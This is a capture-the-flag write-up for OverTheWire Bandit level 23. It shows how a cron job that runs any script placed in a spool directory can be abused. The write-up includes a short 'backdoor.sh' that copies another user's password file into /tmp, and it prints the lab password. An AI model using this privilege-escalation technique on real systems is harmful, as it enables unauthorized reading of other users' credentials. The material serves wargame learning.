## Objective : 
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Solution : 
The password for next level is "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8".

## Explanation : 

### Step 1 : 
-  `ls` the directory`/etc/cron.d`

```bash
bandit23@bandit:/etc/cron.d$ ls  
clean_tmp         cronjob_bandit23  e2scrub_all  sysstat  
cronjob_bandit22  cronjob_bandit24  otw-tmp-dir 
```



-  Viewed the contents of `cronjob_bandit24` got an script `/usr/bin/cronjob_bandit24.sh`, read that file: 

 ```bash
 bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh    
#!/bin/bash  
  
myname=$(whoami)  
  
cd /var/spool/$myname/foo  
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"  
for i in * .*;  
do  
   if [ "$i" != "." -a "$i" != ".." ];  
   then  
       echo "Handling $i"  
       owner="$(stat --format "%U" ./$i)"  
       if [ "${owner}" = "bandit23" ]; then  
           timeout -s 9 60 ./$i  
       fi  
       rm -f ./$i  
   fi  
done
```

we can see in this script that,  it is going to `/var/spool/bandit24/foo` .
### Step 2 : 
so, I went to that directory, tried to `ls` but permission denied. 
therefore, created an `backdoor.sh` script : 

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/b24_by_bandit23
```
and gave it permission to execute then waited for 1 minute to let `cron` run this script,
using the commands : 

```bash
bandit23@bandit:/var/spool/bandit24/foo$ echo '#!/bin/bash' > backdoor.sh  
bandit23@bandit:/var/spool/bandit24/foo$ echo 'cat /etc/bandit_pass/bandit24 > /tmp/b24  
_by_bandit23' >> backdoor.sh  
bandit23@bandit:/var/spool/bandit24/foo$ chmod +x backdoor.sh
```

### Step 3 : 
finally, read the file `/tmp/b24_by_bandit23` and voila we got the password !
